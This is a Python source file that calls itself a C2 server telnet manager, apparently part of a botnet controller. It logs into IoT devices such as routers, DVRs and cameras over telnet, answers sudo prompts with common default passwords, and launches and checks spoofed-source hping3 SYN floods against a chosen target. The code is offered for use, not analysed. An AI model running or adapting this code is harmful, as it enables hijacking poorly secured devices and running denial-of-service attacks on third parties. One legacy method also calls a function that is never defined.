# C2 server telnet manager
import telnetlib
import logging
import time
import re
import socket

class TelnetManager:
    def __init__(self):
        self.active_sessions = {}
          # Known command patterns for different device types
        self.device_commands = {
            'busybox': {
                'echo': 'echo {text}',
                'ping': 'ping -c 3 {target}',
                'syn_flood': 'sudo hping3 -S -p {port} --flood --rand-source {target}'
            },
            'generic': {
                'echo': 'echo {text}',
                'ping': 'ping -c 3 {target}',
                'syn_flood': 'sudo hping3 -S -p {port} --flood --rand-source {target}'
            }
        }
        
        # Common login prompts for telnet
        self.login_patterns = [
            b"login: ", b"Username: ", b"Login: ", b"user: ", b"User: "
        ]
        
        # Common password prompts
        self.password_patterns = [
            b"Password: ", b"password: ", b"Password:", b"password:", 
            b"passcode: ", b"Passcode: "
        ]
        
        # Shell prompts for different device types
        self.shell_patterns = [
            b"$ ", b"# ", b"> ", b"$", b"#", b">", b"~", b"~]",
            b"admin@", b"root@", b"user@", b"menu>"
        ]
        
        # Error patterns that indicate command failure
        self.error_patterns = [
            b"command not found", b"Permission denied", b"sudo: command not found",
            b"not found", b"No such file or directory", b"Cannot execute", 
            b"unknown command", b"Error:", b"error:"
        ]
    
    def execute_telnet_login_and_send(self, ip, username, password, command):
        """Establish Telnet connection, login, send command, and verify execution"""
        tn = None
        try:
            logging.info(f"Attempting Telnet connection to {ip}:23")
            # Set shorter timeout to detect network issues faster
            tn = telnetlib.Telnet(ip, 23, timeout=25)
            logging.info(f"Telnet connection to {ip} established")
            
            # Try detecting the device type
            device_type = self._detect_device_type(tn)
            logging.info(f"Detected device type for {ip}: {device_type}")
            
            # Handle login prompt with retry mechanism
            logged_in = self._handle_login(tn, ip, username, password)
            if not logged_in:
                if tn:
                    tn.close()
                return None
                
            # Execute the command with customization for device type
            executed = self._execute_command(tn, ip, command, device_type)
            if not executed:
                if tn:
                    tn.close()
                return None
                
            # Store the session for future reference
            self.active_sessions[ip] = tn
            return tn

        except socket.timeout:
            logging.error(f"Connection timeout while connecting to {ip}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None
        except ConnectionRefusedError:
            logging.error(f"Connection refused by {ip}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None
        except Exception as e:
            logging.error(f"✗ Telnet execution failed for {ip}: {e}")
            if tn:
                try:
                    tn.close()
                except:
                    pass
            return None

    def _detect_device_type(self, tn):
        """Try to detect device type based on banner"""
        try:
            # Read initial banner - some devices send information before prompting
            banner = tn.read_until(b"login", timeout=3)
            banner_text = banner.decode(errors='ignore').lower()
            
            # Try to identify the device type
            if 'busybox' in banner_text:
                return 'busybox'
            elif 'router' in banner_text:
                return 'router'
            elif 'dvr' in banner_text or 'nvr' in banner_text:
                return 'dvr'
            elif 'camera' in banner_text or 'ipcam' in banner_text:
                return 'camera'
                
            # Default to generic
            return 'generic'
            
        except Exception as e:
            logging.debug(f"Error detecting device type: {e}")
            return 'generic'
            
    def _handle_login(self, tn, ip, username, password, max_retries=2):
        """Handle login process with retry mechanism"""
        retries = 0
        
        while retries <= max_retries:
            try:
                # Wait for login prompt
                index, match, response = tn.expect(self.login_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                logging.info(f"Login response from {ip}: {response_text}")
                
                if not match:
                    if retries < max_retries:
                        # Try sending a newline to trigger login prompt
                        tn.write(b"\n")
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No login prompt detected on {ip} after {max_retries} retries")
                        return False
                
                # Send username
                tn.write(username.encode() + b"\n")
                logging.info(f"Sent username '{username}' to {ip}")
                
                # Wait for password prompt
                index, match, response = tn.expect(self.password_patterns, timeout=10)
                response_text = response.decode(errors='ignore')
                logging.info(f"Password prompt response from {ip}: {response_text}")
                
                if not match:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No password prompt detected on {ip} after {max_retries} retries")
                        return False
                
                # Send password
                tn.write((password or "").encode() + b"\n")
                logging.info(f"Sent password to {ip}")
                
                # Wait for shell prompt
                index, match, response = tn.expect(self.shell_patterns, timeout=15)
                response_text = response.decode(errors='ignore')
                
                # Check for login failure messages
                if any(msg in response_text.lower() for msg in ['login incorrect', 'access denied', 'authentication failed']):
                    logging.error(f"✗ Login failed for {ip} - authentication rejected")
                    return False
                    
                if not match:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.error(f"✗ No shell prompt detected on {ip} after login")
                        return False
                
                # Verify login with a simple echo command
                tn.write(b"echo TELNET_LOGIN_SUCCESS\n")
                index, match, response = tn.expect([b"TELNET_LOGIN_SUCCESS"], timeout=5)
                
                if match:
                    logging.info(f"✓ Login verified on {ip}")
                    return True
                else:
                    if retries < max_retries:
                        # Try again
                        retries += 1
                        continue
                    else:
                        logging.warning(f"? Could not verify login on {ip} - proceeding anyway")
                        return True  # Still return true as we might be logged in
                
            except Exception as e:
                logging.error(f"✗ Error in login process for {ip}: {e}")
                if retries < max_retries:
                    retries += 1
                    continue
                else:
                    return False
                    
        return False
        
    def _execute_command(self, tn, ip, command, device_type='generic'):
        """Execute command with enhanced verification, sudo handling, and detailed progress monitoring"""
        try:
            logging.info(f"🔄 Step 1: Executing command on {ip}: {command}")
            
            # Send command
            tn.write(command.encode() + b"\n")
            
            # Step 2: Check for sudo password prompt
            sudo_patterns = [
                b"[sudo] password for", b"Password:", b"password:", 
                b"sudo:", b"Password for", b"Enter password"
            ]
            
            hping_patterns = [
                b"HPING", b"hping", b"--- hping statistic ---", b"flood mode",
                b"HPING3", b"hping3", b"packets", b"flooding", b"sending", b"bytes from"
            ]
            
            # Combine all possible patterns
            all_patterns = sudo_patterns + hping_patterns + self.shell_patterns + self.error_patterns
            
            logging.info(f"🔄 Step 2: Waiting for initial response from {ip}...")
            
            # Wait for initial response with increased timeout
            index, match, response = tn.expect(all_patterns, timeout=15)
            response_text = response.decode(errors='ignore')
            
            # Log the response for debugging
            logging.info(f"📋 Initial response from {ip}: {repr(response_text[:300])}")
            
            if match:
                matched_text = match.group(0).decode(errors='ignore')
                
                # Check if sudo password is required
                if index < len(sudo_patterns):
                    logging.info(f"🔑 Step 3: Sudo password required on {ip}, attempting to provide password")
                    
                    # Get the device credentials from active sessions or use common password
                    device_password = self._get_device_password(ip)
                    
                    # Send the password
                    tn.write((device_password or "admin").encode() + b"\n")
                    logging.info(f"🔑 Sent sudo password to {ip}")
                    
                    # Wait for command execution after password
                    logging.info(f"🔄 Step 4: Waiting for command execution after sudo password on {ip}")
                    time.sleep(2)
                    
                    index, match, response = tn.expect(hping_patterns + self.shell_patterns + self.error_patterns, timeout=20)
                    response_text = response.decode(errors='ignore')
                    logging.info(f"📋 Post-sudo response from {ip}: {repr(response_text[:300])}")
                
                # Check for errors
                if any(error in response_text.lower() for error in ['command not found', 'permission denied', 'no such file']):
                    logging.error(f"❌ Command failed on {ip}: {response_text}")
                    
                    # Try alternative command format
                    if 'hping3' in command and 'command not found' in response_text.lower():
                        alt_command = command.replace('hping3', 'hping')
                        logging.info(f"🔄 Step 5: Trying alternative command on {ip}: {alt_command}")
                        tn.write(alt_command.encode() + b"\n")
                        
                        # Check if alternative command worked
                        time.sleep(3)
                        index, match, response = tn.expect(hping_patterns + self.shell_patterns, timeout=15)
                        if any(pattern in response for pattern in hping_patterns):
                            logging.info(f"✅ Alternative command succeeded on {ip}")
                            return self._verify_hping_execution_detailed(tn, ip)
                        else:
                            logging.error(f"❌ Alternative command also failed on {ip}")
                            return False
                    else:
                        return False
                
                # Check for hping patterns indicating success
                elif any(pattern in response_text.lower() for pattern in [b"hping", b"flooding", b"packets", b"sending"]):
                    logging.info(f"✅ HPING3 command execution detected on {ip}")
                    return self._verify_hping_execution_detailed(tn, ip)
                
                # If we got a shell prompt back, the command might be running in background
                elif any(pattern in response_text for pattern in ["$", "#", ">"]):
                    logging.info(f"🔄 Shell prompt returned on {ip}, checking if command is running in background...")
                    return self._verify_hping_execution_detailed(tn, ip)
                
                else:
                    logging.info(f"🔄 Checking command execution status on {ip}...")
                    return self._verify_hping_execution_detailed(tn, ip)
            else:
                # No pattern matched, command might be running
                logging.info(f"🔄 No immediate response pattern matched on {ip} - checking if command is executing...")
                time.sleep(3)  # Give more time for command to start
                return self._verify_hping_execution_detailed(tn, ip)
                
        except Exception as e:
            logging.error(f"❌ Error executing command on {ip}: {e}")
            return False
    
    def _get_device_password(self, ip):
        """Get the device password for sudo authentication"""
        # Try to get password from session context or use common defaults
        common_passwords = ["admin", "password", "root", "123456", ""]
        return common_passwords[0]  # Start with most common
    
    def close_session(self, session):
        """Close a telnet session"""
        try:
            # Remove from active sessions dict
            for ip, tn in list(self.active_sessions.items()):
                if tn == session:
                    del self.active_sessions[ip]
                    break
                    
            # Close the session
            if session:
                session.close()
                logging.info("Closed telnet session")
        except Exception as e:
            logging.error(f"Error closing telnet session: {e}")
    
    def close_all_sessions(self):
        """Close all active telnet sessions"""
        for ip in list(self.active_sessions.keys()):
            try:
                session = self.active_sessions[ip]
                session.close()
                logging.info(f"Closed telnet session for {ip}")
                del self.active_sessions[ip]
            except Exception as e:
                logging.error(f"Error closing telnet session for {ip}: {e}")
    
    def _verify_hping_execution_detailed(self, tn, ip):
        """Detailed verification of hping3 command execution with step-by-step logging"""
        try:
            logging.info(f"🔍 Step 6: Starting detailed hping3 verification for {ip}...")
            
            # Step 1: Check for active hping3 processes
            logging.info(f"🔍 Step 6.1: Checking for active hping3 processes on {ip}")
            tn.write(b"ps aux | grep -E '(hping|flood)' | grep -v grep\n")
            time.sleep(3)
            
            # Look for process listing
            index, match, response = tn.expect([
                b"hping", b"HPING", b"flood", b"--rand-source", 
                b"sudo", b"$", b"#", b">", b"root", b"admin"
            ], timeout=10)
            
            response_text = response.decode(errors='ignore')
            logging.info(f"📋 Process check response from {ip}: {repr(response_text[:300])}")
            
            # Check if we can see hping in the process list
            if any(keyword in response_text.lower() for keyword in ['hping', 'flood', 'rand-source']):
                logging.info(f"✅ Step 6.1 SUCCESS: HPING3 process verified running on {ip}")
                
                # Step 2: Check network activity and connections
                logging.info(f"🔍 Step 6.2: Checking network activity on {ip}")
                tn.write(b"netstat -tuln 2>/dev/null | head -10 || echo 'NETSTAT_COMPLETE'\n")
                time.sleep(2)
                
                try:
                    # Read any additional output that might show network activity
                    additional = tn.read_very_eager()
                    if additional:
                        additional_text = additional.decode(errors='ignore')
                        logging.info(f"📋 Network status from {ip}: {repr(additional_text[:200])}")
                except:
                    pass
                
                # Step 3: Final verification with CPU/process check
                logging.info(f"🔍 Step 6.3: Final CPU/process verification on {ip}")
                tn.write(b"top -bn1 | head -10 | grep -E '(hping|flood)' || echo 'CPU_CHECK_COMPLETE'\n")
                time.sleep(2)
                
                try:
                    cpu_check = tn.read_very_eager()
                    if cpu_check:
                        cpu_text = cpu_check.decode(errors='ignore')
                        logging.info(f"📋 CPU check from {ip}: {repr(cpu_text[:150])}")
                        
                        if any(indicator in cpu_text.lower() for indicator in ['hping', 'flood']):
                            logging.info(f"✅ Step 6.3 SUCCESS: HPING3 CPU activity confirmed on {ip}")
                except:
                    pass
                
                # Step 4: Check for HPING3 output directly
                logging.info(f"🔍 Step 6.4: Checking for live HPING3 output on {ip}")
                tn.write(b"echo '=== HPING STATUS CHECK ==='\n")
                time.sleep(1)
                
                try:
                    # Try to capture any ongoing hping output
                    status_check = tn.read_very_eager()
                    if status_check:
                        status_text = status_check.decode(errors='ignore')
                        logging.info(f"📋 Status check from {ip}: {repr(status_text[:200])}")
                        
                        # Look for hping output patterns
                        if any(pattern in status_text.lower() for pattern in ['hping', 'packets', 'bytes', 'icmp', 'tcp']):
                            logging.info(f"✅ Step 6.4 SUCCESS: Live HPING3 output detected on {ip}")
                except:
                    pass
                
                logging.info(f"✅ COMPREHENSIVE SUCCESS: HPING3 verified running on {ip}")
                return True
            else:
                logging.warning(f"❌ Step 6.1 FAILED: No hping3 process found in process list on {ip}")
                
                # Try alternative verification methods
                logging.info(f"🔍 Step 6.5: Trying alternative process detection on {ip}")
                tn.write(b"pgrep -f hping 2>/dev/null\n")
                time.sleep(2)
                
                try:
                    pgrep_response = tn.read_very_eager()
                    if pgrep_response:
                        pgrep_text = pgrep_response.decode(errors='ignore').strip()
                        logging.info(f"📋 Pgrep response from {ip}: {repr(pgrep_text)}")
                        
                        if pgrep_text and any(char.isdigit() for char in pgrep_text):
                            # Extract potential PIDs
                            pids = [word for word in pgrep_text.split() if word.isdigit()]
                            if pids:
                                logging.info(f"✅ Step 6.5 SUCCESS: HPING3 process found via pgrep on {ip}: PIDs {pids}")
                                return True
                except:
                    pass
                
                # Final attempt: Check if command might be running but not showing in ps
                logging.info(f"🔍 Step 6.6: Final verification attempt on {ip}")
                tn.write(b"killall -0 hping3 2>/dev/null && echo 'HPING3_RUNNING' || echo 'HPING3_NOT_FOUND'\n")
                time.sleep(2)
                
                try:
                    final_check = tn.read_very_eager()
                    if final_check:
                        final_text = final_check.decode(errors='ignore')
                        logging.info(f"📋 Final check from {ip}: {repr(final_text)}")
                        
                        if 'HPING3_RUNNING' in final_text:
                            logging.info(f"✅ Step 6.6 SUCCESS: HPING3 confirmed running via killall check on {ip}")
                            return True
                        elif 'HPING3_NOT_FOUND' in final_text:
                            logging.error(f"❌ Step 6.6 FAILED: HPING3 confirmed NOT running on {ip}")
                except:
                    pass
                
                logging.error(f"❌ COMPREHENSIVE FAILURE: Could not verify HPING3 execution on {ip}")
                return False
                
        except Exception as e:
            logging.error(f"❌ Error in detailed hping3 verification for {ip}: {e}")
            return False

    def _verify_hping_execution(self, tn, ip):
        """Legacy verification method - kept for compatibility"""
        return self._verify_comprehensive_execution(tn, ip)
